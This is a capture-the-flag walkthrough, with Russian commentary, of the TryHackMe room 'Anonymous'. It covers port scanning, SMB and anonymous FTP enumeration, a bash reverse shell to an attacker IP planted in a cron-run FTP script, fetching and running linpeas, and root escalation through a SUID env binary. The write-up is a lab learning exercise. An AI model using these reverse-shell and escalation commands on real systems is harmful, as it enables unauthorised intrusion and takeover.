https://tryhackme.com/room/anonymous

> [!IP]
> 10.10.43.173

```
nmap -sS 10.10.43.173 -T4 -p- -vv
```


```
Discovered open port 139/tcp on 10.10.43.173
Discovered open port 445/tcp on 10.10.43.173
Discovered open port 22/tcp on 10.10.43.173
Discovered open port 21/tcp on 10.10.43.173
```

```
sudo nmap 10.10.43.173 -vv -p139,445,22,21 -sC -sV -A 
```

![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419222118.png)



```
enum4linux 10.10.43.173
```
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419223913.png)
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419223925.png)


```
smbclient //10.10.43.173/pics -N
```

![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419222844.png)

![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419223102.png)

Явно что то связанное со стенографией....
```
ftp 10.10.43.173
```
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419224357.png)
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419224549.png)

В логах ничего интересного. А то что анонимный вход нужно выключить он прав).Возможно скрипт выполняется заданием cron.
```
echo "#\!/bin/bash" > clean.sh
echo "bash -i &>/dev/tcp/10.11.134.170/1338 <&1" >> clean.sh
```

```
ftp 10.10.43.173
Name (10.10.43.173:kali): ANONYMOUS
ftp> cd scripts
ftp> ls
ftp> rename clean.sh clear_1.sh
ftp> put clean.sh 
ftp> chmod +x clean.sh
550 Permission denied.
```

Оказалось что я не достаточно прав, так что изменяю на лету ((
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419230618.png)
Получилось через lftp, edit clean.sh реверс прилетел буквально через пару минут
# Флаг User
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419230745.png)

# LPE
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

```
wget http://10.11.134.170/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419231114.png)
SUID
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419231422.png)

Привет контейнер?
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419231524.png)

https://gtfobins.github.io/
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419231625.png)

```
namelessone@anonymous:/tmp$ env /bin/bash -p
env /bin/bash -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
# Flag2
![anonymous](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/anonymous/screenshots/20250419232631.png)
